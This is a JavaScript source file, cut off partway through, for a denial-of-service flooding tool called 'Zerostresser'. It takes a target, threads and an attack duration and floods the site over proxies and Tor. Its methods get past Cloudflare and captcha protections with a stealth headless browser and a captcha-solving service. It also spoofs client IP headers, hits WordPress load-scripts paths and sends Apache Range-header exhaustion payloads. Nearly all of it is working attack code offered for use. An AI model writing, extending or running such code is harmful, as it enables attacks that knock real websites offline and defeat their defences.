require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const cluster = require('cluster'),
    tls = require('tls'),
    fs = require("fs"),
    http = require("http"),
    https = require("https"),
    colors = require("colors"),
    {ArgumentParser} = require('argparse'),
    http2 = require("http2"),
    {HttpProxyAgent} = require('hpagent'),
    cloudscraper = require('cloudscraper'),
    {SocksProxyAgent} = require('socks-proxy-agent'),
    querystring = require("querystring"),
    {parse} = require('url'),
    {SocksClient} = require("socks"),
    puppeteer = require('puppeteer-extra'),
    stealth = require('puppeteer-extra-plugin-stealth')(),
    {executablePath} = require('puppeteer'),
    RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'),
    {constants, randomBytes, randomUUID} = require("crypto");

stealth.onBrowser = () => null;
puppeteer.use(stealth);
puppeteer.use(RecaptchaPlugin({
    provider: {
        id: '2captcha',
    },
    visualFeedback: true
}))

process.on('uncaughtException', () => null);
process.on('unhandledRejection', () => null);

function main() {
    const parser = new ArgumentParser({description: `${colors.magenta("Zerostresser")} private script write in js by MH_ProDev.`})

    parser.add_argument('-t', '--target', {help: 'The target address', required: true});
    parser.add_argument('-r', '--rpc', {help: 'Request pre connection', type: 'int', default: 100});
    parser.add_argument('-d', '--duration', {help: 'Attack time', type: 'int', default: -1});
    parser.add_argument('-x', '--request_type', {
        help: 'Request type',
        default: "GET",
        choices: ["GET", "HEAD", "POST", "DELETE", "PURGE", "PATCH", "PUT"]
    });
    parser.add_argument('-m', '--method', {help: 'Attack Methods', type: 'str', default: "HTTP_RAW"});
    parser.add_argument('-th', '--threads', {help: 'Count of threads should running', type: 'int', default: 10});
    parser.add_argument('-p', '--postdata', {help: 'Custom POST data value'})
    parser.add_argument('-f', '--headers', {help: 'Custom HTTP Headers'})
    parser.add_argument('-b', '--debug', {help: 'Show Errors and exceptions', default: false, action: 'store_true'})
    parser.add_argument('-v', '--verbose', {help: 'Print informention on attack', default: false, action: 'store_true'})

    parser.add_argument('-h2', '--http2', {help: 'Enable http2 feature', default: false, action: 'store_true'})
    parser.add_argument('-s', '--spoof', {help: 'Enable spoof feature', default: false, action: 'store_true'})


    const args = parser.parse_args()

    if (args.debug) {
        process.on('uncaughtException', console.error);
        process.on('unhandledRejection', console.error);
    }

    // noinspection JSCheckFunctionSignatures
    MagicData.PROTECTIONS = JSON.parse(fs.readFileSync("protection.json"));
    // noinspection JSUnresolvedVariable
    if (cluster.isMaster) {

        for (let i = 1; i < args["threads"]; i++) {
            // noinspection JSUnresolvedFunction
            console.log(`${colors.green("✔")} Worker ${colors.green("#" + i)} started!`)
            // noinspection JSUnresolvedFunction
            cluster.fork();
        }

        if (args["duration"] > 0) {
            setTimeout(() => {
                console.log(`${colors.yellow("⚠")} Warning! The attack has been stopped!`)
                process.exit(-1);
            }, args["duration"] * 1000)
        } else {
            console.log(`${colors.yellow("⚠")} Warning! The attack time set to ${colors.red("never")}!`)
        }
    }

    flood(args)

}

class Browser {
    static running_browsers = 1
    static proxy_queue = [];

    constructor(target, useragent, proxy) {
        this.target = target
        this.proxy = proxy
        this.useragent = useragent
        this.engine = null
        this.tries = 0
    }


    get_protection(rep) {
        let protection = {"name": "None", "type": "none"};

        if (rep.length <= 5) {
            return protection
        }

        for (const pro of MagicData.PROTECTIONS) {
            if (!rep.includes(pro.data)) {
                continue
            }

            return pro;
        }

        return protection;
    }

    async join_cookies(page) {
        const cookies = await page.cookies()

        let str = "";

        for (const item of cookies) {
            str += `${item.name}=${item.value};`
        }

        return str.slice(0, -1).trim();
    }

    async bypass(callback, page = null) {

        if (!this.engine) {
            page = await this.launch();
        }

        if (!page) {
            Browser.running_browsers--
            return
        }

        const content = await page.content()
        const protection = this.get_protection(content)

        if (protection.name === "None" || this.tries >= 3) {
            Browser.running_browsers--

            const cookies = await this.join_cookies(page)

            if (!cookies) {
                this.engine.close();
                return
            }

            this.engine.close();

            if (this.protection === "None" || !this.protection) {
                this.protection = protection.name
            }


            callback(parse(await page.url()), cookies)

            return
        }

        this.protection = protection.name

        switch (protection.type) {
            case "click":
                await page.click(randomInteger(1, 666))
                break

            case "banned":
                this.engine.close();
                Browser.running_browsers--
                return

            case "wheel":
                await page.mouse.move(randomInteger(1, 666), randomInteger(1, 666));
                await page.mouse.down();
                await page.mouse.move(randomInteger(1, 666), randomInteger(1, 666));
                await page.mouse.up();
                await page.mouse.move(randomInteger(1, 666), randomInteger(1, 666));
                return

            case "captcha":
                await page.solveRecaptchas()
                break
        }

        for (let i = 0; i < protection["navigations"] ?? 1; i++) {
            await page.waitForNavigation({
                waitUntil: 'domcontentloaded',
                timeout: 20000
            });
        }

        this.tries += 1
        await this.bypass(callback, page)

    }

    async startFlood(attack) {
        try {
            await this.bypass((target, cookies) => {
                if (attack.is_verbose) {
                    console.log(`${colors.green("🎈")} ${this.proxy} ${this.protection} Bypassed! ${cookies} Path: ${target.href}`)
                }

                setInterval(() => {
                    this.proxy.openConnection(attack.target, {
                        "tls": target.protocol === "https:",
                        "http2": attack.is_http2,
                        "no_cipher": true,
                        "tls_options": {
                            "secureOptions": "SSL_OP_ALL",
                            "requestCert": true,
                            "secure": true,
                            "rejectUnauthorized": false,
                            "secureProtocol": undefined,
                            "sessionTimeout": 10000,
                            "minVersion": 'TLSv1.3',
                            "maxVersion": 'TLSv1.3',
                        }
                    }, (socket) => {

                        const payload = `GET ${attack.target.path}${attack.target.path.includes("?") ? "&" : "?"}%RAND%=%RAND% HTTP/1.1\r\nHost: ${target.hostname}\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: ${this.useragent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nSec-GPC: 1\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Language: en-US,en;q=0.9\r\nReferer: ${target.href}\r\nOrigin: ${attack.target.href}\r\nCookie: ${cookies}\r\nAccept-Encoding: gzip, deflate\r\n\r\n`

                        for (let i = 0; i < attack.rpc; i++) {
                            socket.write(randomize_payload(payload))
                        }

                    })
                });
            })
        } catch (e) {
            Browser.running_browsers--
        }
    }

    async launch() {
        Browser.running_browsers++

        this.engine = await puppeteer.launch({
            args: [
                `--proxy-server=${this.proxy.toString()}`,
                `--user-agent=${this.useragent}`,
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-gpu',
                '--hide-scrollbars',
                '--mute-audio',
                '--disable-gl-drawing-for-tests',
                '--disable-canvas-aa',
                '--disable-2d-canvas-clip-aa',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-spki-list',
                '--disable-features=IsolateOrigins,site-per-process'
            ],
            headless: true,
            ignoreHTTPSErrors: true,
            executablePath: executablePath(),
        });

        const page = await this.engine.newPage();
        await page.goto(randomize_payload(this.target.href), {"waitUntil": 'networkidle2'});

        return page

    }

    static async check(proxy) {
        return await new Promise((resolve) => {
            const con = http.get("http://ifconfig.co/", {
                headers: {
                    "User-Agent": "curl/7.58.0"
                },
                "agent": proxy.asAgent()
            }, (req) => {
                if (req.statusCode !== 200) return
                resolve()
                Browser.proxy_queue.push(proxy)
            }).on('error', () => con.destroy()).end()
        });
    }

    static start_checker(proxies) {
        Promise.all(proxies.map((x) => Browser.check(x))).then(() => {
            Browser.start_checker(proxies)
        })

    }
}

const http_agent = new http.Agent({
    "keepAlive": true,
    "keepAliveMsecs": 12500,
    "maxSockets": Infinity,
});

function detectEncoding(data) {
    let value = "text/plain"

    if (data.startsWith("{") && data.endsWith("}")) {
        value = "application/json"
    } else if (data.includes("</")) {
        value = "multipart/form-data"
    } else if (data.includes("%20") || data.includes("=")) {
        value = "application/x-www-form-urlencoded"
    }

    return value
}

function randomize_payload(payload) {
    payload = "" + payload
    if (!payload.includes("%RAND")) return payload;

    let regex = /%RAND(?:OM)?(;\d{1,2})?(;ABL|;ABU|;ABR|;DIGIT|;HEX|;SPACE|;UUID|;IPV4|;BYTES|;EMAIL)?%/
    let m;

    while ((m = regex.exec(payload)) !== null) {
        if (m.index === regex.lastIndex) {
            regex.lastIndex++;
        }

        let chars = RandomizedPayloads.full
        let length = 16;

        if (m[1]) {
            length = parseInt(m[1].substring(1))
            if (length <= 0) length = 16
        }

        if (m[2]) switch (m[2].toUpperCase()) {
            case ";ABL":
                chars = RandomizedPayloads.alphabet_lower
                break
            case ";ABU":
                chars = RandomizedPayloads.alphabet_upper
                break
            case ";ABR":
                chars = RandomizedPayloads.alphabet
                break
            case ";DIGIT":
                chars = RandomizedPayloads.digits
                break
            case ";SPACE":
                chars = MagicData.NULL
                break
            case ";UUID":
                payload = payload.replace(regex, randomUUID())
                continue
            case ";BYTES":
                payload = payload.replace(regex, randomBytes(length).toString())
                continue
            case ";IPV4":
                payload = payload.replace(regex, randomIPV4())
                continue
            case ";EMAIL":
                payload = payload.replace(regex, randomString(length) + "@" + randomChoice(MagicData.SAFE_MAIL_PROVIDERS))
                continue
            case ";HEX":
                payload = payload.replace(regex, randomBytes(length).toString("hex"))
                continue
        }


        payload = payload.replace(regex, randomString(length, chars))
    }

    return payload
}

class RandomizedPayloads {
    static alphabet_lower = 'bcdefghiklmnopqrstuvwxyz'
    static alphabet_upper = RandomizedPayloads.alphabet_lower.toUpperCase()
    static alphabet = RandomizedPayloads.alphabet_lower + RandomizedPayloads.alphabet_upper
    static digits = "0123456789"

    static full = RandomizedPayloads.digits + RandomizedPayloads.alphabet
}

function randomString(length = 16, chars = RandomizedPayloads.full) {
    let str = '';
    for (let i = 0; i < length; i++) {
        str += randomChoice(chars);
    }
    return str;
}

function randomChoice(data) {
    return data[Math.floor(Math.random() * data.length)]
}

function randomInteger(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

class Proxy {
    constructor(type, host, port) {
        this.type = type.toLowerCase();
        this.host = host;
        this.port = parseInt(port);
        this.socksType = -1;

        if (this.type.startsWith('socks5')) {
            this.socksType = 5;
        } else if (this.type.startsWith('socks4')) {
            this.socksType = 4;
        }
    }

    toString() {
        return `${this.type}://${this.host}:${this.port}`
    }

    asAgent() {
        if (this.type.startsWith("socks")) {
            return new SocksProxyAgent(this.toString())
        }

        return new HttpProxyAgent({
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: Infinity,
            maxFreeSockets: 256,
            scheduling: 'lifo',
            proxy: this.toString()
        })


    }

    create_tls(target, options, socket) {
        let tls_options = {
            "ciphers": options.ciphers,
            "secureProtocol": [
                'TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3',
                'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'
            ],
            "servername": target.hostname,
            "host": target.authority,
            "honorCipherOrder": true,
            "secure": true,
            "requestCert": true,
            "rejectUnauthorized": false,
            "socket": socket
        }


        if (options.http2) {
            tls_options["secureProtocol"] = "TLS_method"
            tls_options["ALPNProtocols"] = ['h2']
        } else {
            tls_options["secureOptions"] = constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1_1
        }

        if (options.tls_options) {
            for (let tlsOptionsKey in options.tls_options) {
                if (!options.tls_options[tlsOptionsKey]) {
                    delete tls_options[tlsOptionsKey]
                    continue
                }
                tls_options[tlsOptionsKey] = options.tls_options[tlsOptionsKey]
            }
        }

        return new Promise((resolve) => {
            const conn = tls.connect(tls_options, () => resolve(conn))
                .setKeepAlive(true, 17500)
                .setTimeout(19500)
                .on('disconnected', () => conn.destroy())
                .on('timeout', () => conn.destroy())
                .on('error', () => conn.destroy())
                .on('end', () => conn.destroy());
        })

    }

    openConnection(target, options, callback) {
        let connection_option;

        if (options.tls && !options["ciphers"] && !options["no_cipher"]) {
            options["ciphers"] = randomChoice(ciphers)
        }

        if (this.type.startsWith("socks")) {
            connection_option = {
                "proxy": {
                    "host": this.host,
                    "port": this.port,
                    "type": this.socksType
                },
                "command": 'connect',
                "destination": {
                    "host": target.hostname,
                    "port": options.tls ? target.port ?? 443 : target.port ?? 80
                }
            }

            // noinspection JSIgnoredPromiseFromCall
            SocksClient.createConnection(connection_option, (err, info) => {
                if (err) return;

                if (options.tls) {
                    this.create_tls(target, options, info.socket).then(callback)
                    return
                }

                callback(info.socket)
            });
            return
        }

        const con = http.request({
            "host": this.host,
            "port": this.port,
            "path": target.host,
            "method": "CONNECT",
        }).on("connect", (resp, socket) => {
            if (resp.statusCode !== 200) return;

            if (options.tls) {
                this.create_tls(target, options, socket).then(callback)
                return
            }

            callback(socket)

        }).on('error', () => con.destroy()).on('data', () => null).end();
    }
}

const ciphers = [
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
]


function join_map(maps) {
    return Object.keys(maps).map(k => `${k}: ${maps[k]}`).join("\r\n")
}

function build_payload(options) {
    return options["method"] + " " + options["path"] + " HTTP/" + randomChoice(MagicData.HTTP_VERSIONS) + "\r\n"
        + join_map(options["headers"]) + "\r\n\r\n" + options["data"]
}


class MagicData {
    static PROTECTIONS = []
    static TOR_NETWORK = new SocksProxyAgent("socks5h://127.0.0.1:9050")
    static SAFE_MAIL_PROVIDERS = ["gmail.com", "zerostresser.com", "aim.com", "aol.com",
        "icloud.com", "outlook.com", "hotmail.com",
        "zoho.com", "yandex.com", "titan.email",
        "gmx.com", "hubspot.com", "mail.com",
        "tutanota.com",
        "yahoo.com", "protonmail.com", "pm.com"]
    static WORDPRESS_EXPLOITS = [
        "/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic",
        "/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"
    ]
    static NULL = [
        "\x00", "\xFF", "\xC2", "\xA0", "\x82", "\x56", "\x87", "\x88", "\x27", "\x31", "\x18", "\x42",
        "\x17", "\x90", "\x14", "\x82", "\x18", "\x26", "\x61", "\x04", "\x05", "\xac", "\x02", "\x50",
        "\x84", "\x78"];
    static HTTP_VERSIONS = [
        "1.1", "1.2"
    ]
}


function randomIPV4() {
    return `${randomInteger(0, 255)}.${randomInteger(0, 255)}.${randomInteger(0, 255)}.${randomInteger(0, 255)}`;
}

function randomize_map(headers) {
    let randomized_header = {}
    for (const header in headers) {
        randomized_header[header] = randomize_payload(headers[header])
    }
    return randomized_header
}

// noinspection JSUnusedGlobalSymbols,JSUnresolvedFunction
class Attack {
    constructor(target,
                user_agents,
                rpc,
                request_type,
                path,
                custom_headers = {},
                custom_data = "",
                verbose = false,
                http2 = false,
                ip_spoof = false) {
        this.target = target
        this.rpc = rpc
        this.user_agents = user_agents
        this.path = path
        this.custom_data = custom_data
        this.custom_headers = custom_headers
        this.request_type = request_type
        this.is_verbose = verbose
        this.is_http2 = http2
        this.is_ip_spoof = ip_spoof

    }

// TODO: Must add http2 on tor bypass
    TOR_BYPASS(attack) {
        const protocol = attack.target.protocol.toLowerCase() === "https://" ? https : http

        let options = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Dest": "document",
            "Cache-Control": "max-age=0",
            "TE": 'trailers',
            "Pragma": 'no-cache',
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Gpc": "1",
            "User-Agent": randomChoice(attack.user_agents)
        }

        for (const key in attack.custom_headers) {
            options[key] = attack.custom_headers[key]
        }

        if (attack.is_http2) {
            // code here
            return
        }

        setInterval(() => protocol.request(randomize_payload(attack.target.href), {
            "method": attack.request_type,
            "headers": randomize_map(options),
            "agent": MagicData.TOR_NETWORK
        }).end());
    }

    HTTP_RAW(attack, socket) {
        const options = {
            "method": attack.request_type,
            "path": attack.path,
            "data": attack.custom_data,
            "headers": {
                "User-Agent": randomChoice(attack.user_agents),
            }
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    HTTP_BYPASS(attack, socket) {
        const options = {
            "method": attack.request_type,
            "path": attack.path,
            "data": attack.custom_data,
            "headers": {
                "Cache-Control": "max-age=0",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": randomChoice(attack.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Sec-GPC": "1",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br"
            },
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    async SELENIUM(attack, proxies) {
        setInterval(() => {
            if (Browser.running_browsers > 100) {
                return
            }

            if (!Browser.proxy_queue) {
                return;
            }

            const proxy = Browser.proxy_queue.shift();

            if (!proxy) {
                return
            }

            const useragent = randomChoice(attack.user_agents);

            // console.log(`${colors.yellow("👑")} [${Browser.running_browsers}] browser opened ${proxy}:${useragent}`)

            new Browser(attack.target, useragent, proxy)
                .startFlood(attack);
        }, 50);

        Browser.start_checker(proxies)

    }

    async CF_BYPASS(attack, proxy) {
        let option = {
            "method": attack.request_type,
            "path": attack.path,
            "data": attack.custom_data,
            "headers": {
                "Cache-Control": "max-age=0",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": randomChoice(attack.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Sec-GPC": "1",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br"
            },
        }

        for (const key in attack.custom_headers) {
            option["headers"][key] = attack.custom_headers[key]
        }

        if (attack.is_ip_spoof) {
            const spoofed_address = randomIPV4()

            option["headers"]["X-Forwarded-Proto"] = "Http"
            option["headers"]["X-Forwarded-Host"] = `${attack.target.hostname}, 1.1.1.1`
            option["headers"]["Via"] = spoofed_address
            option["headers"]["Client-IP"] = spoofed_address
            option["headers"]["X-Forwarded-For"] = spoofed_address
            option["headers"]["Real-IP"] = spoofed_address
        }

        const scraper = cloudscraper.defaults({"proxy": proxy.toString()});

        await scraper({
            "method": attack.request_type,
            "cloudflareTimeout": 5000,
            "cloudflareMaxTimeout": 10000,
            "challengesToSolve": 10,
            "resolveWithFullResponse": true,
            "followAllRedirects": true,
            "headers": option["headers"],
            "uri": randomize_payload(attack.target.href)
        }).then(rep => {

            let i = 0;

            for (let rawHeader of rep.rawHeaders) {
                i++

                if (rawHeader.toLowerCase() !== "set-cookie" && !rawHeader.toLowerCase().startsWith("cookie")) {
                    continue
                }

                if (option["headers"]["Cookie"]) {
                    option["headers"]["Cookie"] += ";" + rep.rawHeaders[i++];
                    break
                }

                option["headers"]["Cookie"] = rep.rawHeaders[i++];
                break
            }


            if (attack.is_verbose) {
                console.log(`${proxy.toString()} Cookies getted: ${option["headers"]["Cookie"]} HTTP/${attack.is_http2 ? 2 : 1.1}`)
            }

            if (attack.is_ip_spoof) {
                const spoofed_address = randomIPV4()

                option["headers"]["X-Forwarded-Proto"] = "Http"
                option["headers"]["X-Forwarded-Host"] = `${attack.target.hostname}, 1.1.1.1`
                option["headers"]["Via"] = spoofed_address
                option["headers"]["Client-IP"] = spoofed_address
                option["headers"]["X-Forwarded-For"] = spoofed_address
                option["headers"]["Real-IP"] = spoofed_address

            }

            option["headers"]["Referer"] = attack.target.href
            option["headers"]["Origin"] = attack.target.href

            for (let j = 0; j < attack.rpc; j++) {
                proxy.openConnection(attack.target, {
                    "tls": attack.target.protocol === "https:",
                    "http2": attack.is_http2
                }, (socket) => {
                    if (!attack.is_http2) {
                        option["headers"]["Host"] = option["headers"]["Host"] ?? attack.target.host
                        option["headers"]["Connection"] = "Keep-Alive"
                        option["headers"]["Upgrade-Insecure-Requests"] = "1"

                        const payload = build_payload(option)

                        for (let i = 0; i < attack.rpc; i++) {
                            socket.write(randomize_payload(payload))
                        }

                        return
                    }

                    option["headers"][":path"] = `${attack.target.path}${!attack.path.includes("?") ? "?" : "&"}%RAND%=%RAND%`
                    option["headers"][":method"] = attack.request_type

                    const client = http2.connect(attack.target.href, {
                            "createConnection": () => socket
                        },
                        () => {
                            for (let i = 0; i < attack.rpc; i++) {
                                const req = client.request(randomize_map(option["headers"]))
                                    .on("response", () => req.close())

                                if (attack.custom_data) {
                                    req.setEncoding('utf8');
                                    req.write(randomize_payload(attack.custom_data));
                                }

                                req.end()

                            }
                        })
                })
            }


        }).catch(() => null)

    }

    WORDPRESS(attack, socket) {
        const options = {
            "method": attack.request_type,
            "path": randomChoice(MagicData.WORDPRESS_EXPLOITS),
            "data": attack.custom_data,
            "headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "document",
                "Cache-Control": "max-age=0",
                "TE": 'trailers',
                "Pragma": 'no-cache',
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Gpc": "1",
                "Referer": attack.target.href,
                "Origin": attack.target.href,
                "User-Agent": randomChoice(attack.user_agents)
            },
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    XOVER_FLOW(attack, socket) {
        let exploit;

        if (!attack.path.includes("?")) {
            exploit = "?%RAND%=%RAND%";
        }

        for (let i = 0; i < 1024; i++) {
            exploit += "&%RAND%=%RAND%"
        }

        const options = {
            "method": attack.request_type,
            "path": attack.path + exploit,
            "data": attack.custom_data,
            "headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "document",
                "Cache-Control": "max-age=0",
                "TE": 'trailers',
                "Pragma": 'no-cache',
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Gpc": "1",
                "Referer": attack.target.href,
                "Origin": attack.target.href,
                "User-Agent": randomChoice(attack.user_agents)
            },
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    APACHE(attack, socket) {
        let exploit = "bytes=0-,"

        for (let i = 0; i < 256; i++) {
            exploit += `5-${i},`
        }

        exploit = exploit.substring(0, exploit.length - 1)

        const options = {
            "method": attack.request_type,
            "path": attack.path,
            "data": attack.custom_data,
            "headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "document",
                "Cache-Control": "max-age=0",
                "TE": 'trailers',
                "Pragma": 'no-cache',
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Range": exploit,
                "Sec-Gpc": "1",
                "Referer": attack.target.href,
                "Origin": attack.target.href,
                "User-Agent": randomChoice(attack.user_agents),
            },
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    HTTP_NULL(attack, socket) {
        const options = {
            "method": attack.request_type,
            "path": attack.path,
            "data": attack.custom_data,
            "headers": {
                "Accept": randomChoice(MagicData.NULL),
                "Accept-Encoding": randomChoice(MagicData.NULL),
                "Accept-Language": randomChoice(MagicData.NULL),
                "Sec-Fetch-Dest": randomChoice(MagicData.NULL),
                "Cache-Control": randomChoice(MagicData.NULL),
                "TE": randomChoice(MagicData.NULL),
                "Pragma": randomChoice(MagicData.NULL),
                "Sec-Fetch-Mode": randomChoice(MagicData.NULL),
                "Sec-Fetch-Site": randomChoice(MagicData.NULL),
                "Sec-Fetch-User": randomChoice(MagicData.NULL),
                "Sec-Gpc": randomChoice(MagicData.NULL),
                "Referer": randomChoice(MagicData.NULL),
                "Origin": randomChoice(MagicData.NULL),
